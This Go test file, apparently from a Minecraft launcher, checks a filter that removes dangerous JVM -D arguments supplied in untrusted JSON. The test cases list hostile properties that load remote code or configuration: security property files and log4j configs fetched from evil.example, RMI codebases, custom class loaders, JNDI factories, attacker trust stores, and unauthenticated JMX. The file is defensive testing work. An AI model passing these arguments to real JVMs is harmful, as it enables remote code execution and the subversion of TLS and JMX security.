package main

import "testing"

// TestParseSystemPropertyArg 覆盖 -D 参数解析边界：正常属性、带值、
// 历史开关 -d32/-dsa、裸 -D。
func TestParseSystemPropertyArg(t *testing.T) {
	cases := []struct {
		arg    string
		name   string
		value  string
		isProp bool
	}{
		{"-Dorg.gradle.jvmargs=-Xmx2G", "org.gradle.jvmargs", "-xmx2g", true},
		{"-DFABRIC_LOADER_VERSION=0.16", "fabric_loader_version", "0.16", true},
		{"-Djna.tmpdir=C:\\Temp", "jna.tmpdir", "c:\\temp", true},
		{"-Dempty=", "empty", "", true},
		{"-Dbare", "bare", "", true},
		{"-d32", "", "", false},
		{"-d64", "", "", false},
		{"-d", "", "", false},
		{"-xmx2g", "", "", false},
	}
	for _, c := range cases {
		gotName, gotValue, gotProp := parseSystemPropertyArg(lowerArg(c.arg))
		if gotProp != c.isProp || gotName != c.name || gotValue != c.value {
			t.Errorf("parseSystemPropertyArg(%q)=(%q,%q,%v), want (%q,%q,%v)",
				c.arg, gotName, gotValue, gotProp, c.name, c.value, c.isProp)
		}
	}
}

// lowerArg 归一化测试输入，模拟过滤热路径在分类前做的 trim+lower。
func lowerArg(s string) string {
	out := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if ch >= 'A' && ch <= 'Z' {
			ch += 'a' - 'A'
		}
		out[i] = ch
	}
	return string(out)
}

// TestJvmPropThreatsBlockSecurityProperties 覆盖最高危的安全属性 / 信任库 /
// JMX / 任意类加载项，任何值都必须判危险。
func TestJvmPropThreatsBlockSecurityProperties(t *testing.T) {
	blocked := []string{
		"-Djava.security.properties=https://evil.example/sec.properties",
		"-Djava.security.properties==file:///attacker/sec.properties",
		"-Djava.security.manager=EvilManager",
		"-Djava.system.class.loader=evil.Loader",
		"-Djava.ext.dirs=C:\\Attacker\\ext",
		"-Djava.endorsed.dirs=C:\\Attacker\\endorsed",
		"-Djava.protocol.handler.pkgs=evil.handlers",
		"-Djava.util.logging.config.class=evil.LogConfig",
		"-Djava.naming.factory.initial=evil.JndiFactory",
		"-Djdk.attach.allowAttachSelf=true",
		"-Djavax.net.ssl.trustStore=C:\\evil\\ca.jks",
		"-Djavax.net.ssl.trustStorePassword=hunter2",
		"-Djavax.net.ssl.trustStoreType=PKCS12",
		"-Djavax.net.ssl.keyStore=C:\\evil\\identity.p12",
		"-Djavax.net.ssl.keyStorePassword=p",
		"-Dcom.sun.management.jmxremote.port=9000",
		"-Dcom.sun.management.jmxremote.ssl=false",
		"-Dcom.sun.management.jmxremote.authenticate=false",
		"-Dcom.sun.management.jmxremote.password.file=C:\\evil\\jmx.password",
		"-Djava.rmi.server.codebase=http://evil.example/classes",
		"-Dlog4j.configurationFactory=evil.LogFactory",
		"-Dlog4j2.configurationFactory=evil.LogFactory",
	}
	for _, arg := range blocked {
		if !jvmPropArgThreat(lowerArg(arg)) {
			t.Errorf("危险系统属性应被拦截: %s", arg)
		}
	}
}

// TestJvmPropThreatsAllowBenignProperties 确保正常加载器 / 性能 / 路径属性不误伤。
func TestJvmPropThreatsAllowBenignProperties(t *testing.T) {
	allowed := []string{
		"-Dorg.gradle.jvmargs=-Xmx2G",
		"-Dfabric.loader.version=0.16.5",
		"-Dfabric.gameJarPath=C:\\MC\\1.20.1",
		"-Djna.tmpdir=C:\\Temp",
		"-Djava.io.tmpdir=C:\\Temp",
		"-Duser.home=C:\\Users\\x",
		"-Dminecraft.launcher.brand=OpenQGL",
		// 近名前缀不能被误伤：jmxremote 必须精确到 com.sun.management.jmxremote。
		"-Dcom.sun.management.other=true",
		// log4j 配置用本地文件系统路径是正常用法，应放行。
		"-Dlog4j.configurationFile=config/log4j2.xml",
		"-Dlog4j2.configurationFile=C:\\App\\log4j2.xml",
	}
	for _, arg := range allowed {
		if jvmPropArgThreat(lowerArg(arg)) {
			t.Errorf("正常系统属性不应被拦截: %s", arg)
		}
	}
}

// TestJvmPropThreatsBlockRemoteLog4jConfig 确认 log4j 配置一旦指向
// http(s):// 或 file: 即判危险，纯本地路径仍放行。
func TestJvmPropThreatsBlockRemoteLog4jConfig(t *testing.T) {
	remote := []string{
		"-Dlog4j.configurationFile=http://evil.example/log4j2.xml",
		"-Dlog4j2.configurationFile=https://evil.example/log4j2.xml",
		"-Dlog4j2.configurationFile=file:///C:/evil/log4j2.xml",
	}
	for _, arg := range remote {
		if !jvmPropArgThreat(lowerArg(arg)) {
			t.Errorf("远程 log4j 配置应被拦截: %s", arg)
		}
	}
}

// TestFilterUntrustedJvmArgsBlocksDProperties 端到端确认外部 JSON 里的
// 危险 -D 参数真的会被 filterUntrustedJvmArgs 剔除。
func TestFilterUntrustedJvmArgsBlocksDProperties(t *testing.T) {
	in := []string{
		"-Xmx2G",
		"-Djava.security.properties=https://evil/p",
		"-Dfabric.gameJarPath=C:\\MC",
		"-Djavax.net.ssl.trustStore=C:\\evil\\ca",
		"-Duser.home=C:\\Users\\x",
	}
	safe, blockedTrash, _ := filterUntrustedJvmArgs(in)
	if len(safe) != 3 {
		t.Fatalf("应保留 3 条正常参数，实际保留 %d: %v", len(safe), safe)
	}
	if len(blockedTrash) != 2 {
		t.Fatalf("应剔除 2 条危险 -D 参数，实际剔除 %d: %v", len(blockedTrash), blockedTrash)
	}
	for _, s := range safe {
		if s == "-Djava.security.properties=https://evil/p" ||
			s == "-Djavax.net.ssl.trustStore=C:\\evil\\ca" {
			t.Errorf("危险 -D 参数漏网: %s", s)
		}
	}
}
